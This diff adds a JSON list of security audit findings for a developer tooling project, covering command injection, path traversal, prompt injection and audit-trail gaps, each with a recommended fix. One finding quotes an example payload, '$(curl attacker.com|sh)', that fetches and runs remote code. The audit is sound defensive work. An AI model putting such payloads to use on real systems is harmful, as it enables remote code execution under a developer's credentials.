@@ -1,0 +1,82 @@
+[
+  {
+    "severity": "SIGNIFICANT",
+    "category": "Command Injection / Trust Boundary",
+    "finding": "startup.sh interpolates the project name from .work/context.json into a printf format string without sanitisation; shell metacharacters in the project name execute on session start.",
+    "evidence": "skill/hedl/integrations/claude-code/startup.sh:6-8",
+    "detail": "PROJECT_NAME comes from command substitution and is then passed unquoted into printf with a format string containing %s. A value like '$(curl attacker.com|sh)' in context.json meta.project runs at every session start (installed as a SessionStart hook by the team tier).",
+    "recommendation": "Use printf '%s' \"$PROJECT_NAME\" and/or sanitise the value in the Python step that emits it (restrict to alphanumeric + safe chars)."
+  },
+  {
+    "severity": "SIGNIFICANT",
+    "category": "Path Traversal",
+    "finding": "install.py applies source and target paths from tiers.json without verifying they resolve inside their expected roots.",
+    "evidence": "skill/hedl/scripts/install.py:258-273",
+    "detail": "source = (SKILL_ROOT / proj['source']).resolve() and target = repo / proj['target'] are never checked to be inside SKILL_ROOT / repo. A malicious or corrupted tiers.json could write or symlink anywhere the user can write.",
+    "recommendation": "After resolution, assert source.is_relative_to(SKILL_ROOT) and target.is_relative_to(repo); abort otherwise."
+  },
+  {
+    "severity": "SIGNIFICANT",
+    "category": "Arbitrary Command Execution via Config",
+    "finding": "am_i_done.py _run_declared_check executes commands declared in hedl.toml [verify] with no whitelist.",
+    "evidence": "skill/hedl/scripts/am_i_done.py:169-203",
+    "detail": "shlex.split prevents shell metacharacter expansion but the executable itself is not validated beyond shutil.which. A PR that adds [verify.x] cmd = '...' becomes RCE under the developer's credentials on the next gate run. cwd is also taken from config without containment.",
+    "recommendation": "Document hedl.toml as a trust boundary; constrain cwd to inside REPO_ROOT; consider an allow-list of permitted verify executables."
+  },
+  {
+    "severity": "SIGNIFICANT",
+    "category": "Trust Boundary / Prompt Injection",
+    "finding": "record_insights.py inspects the Agent tool description (model-controlled) and writes derived fields to events.jsonl.",
+    "evidence": "skill/hedl/integrations/claude-code/scripts/record_insights.py:67-75",
+    "detail": "Description is sourced from tool_input emitted by the model; substring matching is used to derive reviewer identity. Adversarial content in the description could poison records that reflect.py consumes.",
+    "recommendation": "Restrict the recorded reviewer to an exact match against the fixed reviewer set; never persist free-form description content."
+  },
+  {
+    "severity": "SIGNIFICANT",
+    "category": "GitHub Actions — Expression Injection",
+    "finding": "am-i-done workflow inlines ${{ matrix.python-version }} into run: shell commands.",
+    "evidence": "skill/hedl/workflows/am-i-done.yml:41,44",
+    "detail": "Currently safe because the matrix is repo-controlled, but the pattern is flagged by GitHub's own guidance as injection-risky and becomes exploitable if a future change sources matrix values from PR-controlled input.",
+    "recommendation": "Bind the value through env: (PYTHON_VERSION: ${{ matrix.python-version }}) and reference $PYTHON_VERSION in the script."
+  },
+  {
+    "severity": "SIGNIFICANT",
+    "category": "Audit Trail Gap",
+    "finding": "No tamper-evident log of Claude Code hook execution (startup.sh, posttooluse_lint.py, stop_reminder.py).",
+    "evidence": "skill/hedl/integrations/claude-code/settings.json:8-41",
+    "detail": "Hooks run with full filesystem access. record_insights.py only logs Agent tool invocations matching reviewer names; hook failures land in stderr that is not persisted. Contradicts CLAUDE.md's identity -> permission -> blast radius -> validation -> execution principle.",
+    "recommendation": "Append timestamp + hook name + exit code to .work/insights/hook-audit.jsonl on every invocation including error paths."
+  },
+  {
+    "severity": "MINOR",
+    "category": "Information Disclosure",
+    "finding": "check_pr_template.py quotes raw PR body fragments in error output captured by CI logs.",
+    "evidence": "skill/hedl/scripts/check_pr_template.py:139-145",
+    "detail": "On public repos, accidentally-pasted credentials or internal names could leak into public CI logs.",
+    "recommendation": "Describe structural problems without echoing user-supplied content."
+  },
+  {
+    "severity": "MINOR",
+    "category": "Path Traversal",
+    "finding": "reflect.py --work-dir has no containment check.",
+    "evidence": "skill/hedl/scripts/reflect.py:167-185",
+    "detail": "Reads events.jsonl and overwrites metrics.json under any operator-supplied path.",
+    "recommendation": "Resolve and assert inside REPO_ROOT (git rev-parse) or document operator-trust assumption explicitly."
+  },
+  {
+    "severity": "MINOR",
+    "category": "Blast Radius Violation",
+    "finding": "install.py --repo DIR accepts any directory; code does not enforce the stated 'low (workspace-only)' blast radius.",
+    "evidence": "skill/hedl/scripts/install.py:218,259,273",
+    "detail": "Combined with the path-traversal finding, install.py --repo /etc would attempt to write outside any workspace.",
+    "recommendation": "Require .git/ in --repo, or require explicit confirmation when the path is outside the current working tree."
+  },
+  {
+    "severity": "MINOR",
+    "category": "Argument Injection",
+    "finding": "check_streams in am_i_done.py interpolates a user-supplied branch name into a git diff argument list without validating against BRANCH_PATTERN.",
+    "evidence": "skill/hedl/scripts/am_i_done.py:950-952",
+    "detail": "git treats arguments starting with '--' as flags even when passed via list form. A value like '--exec=...' could be interpreted by git as an option.",
+    "recommendation": "Validate each stream branch with the existing BRANCH_PATTERN regex (already at am_i_done.py:230) before constructing the diff argv."
+  }
+]
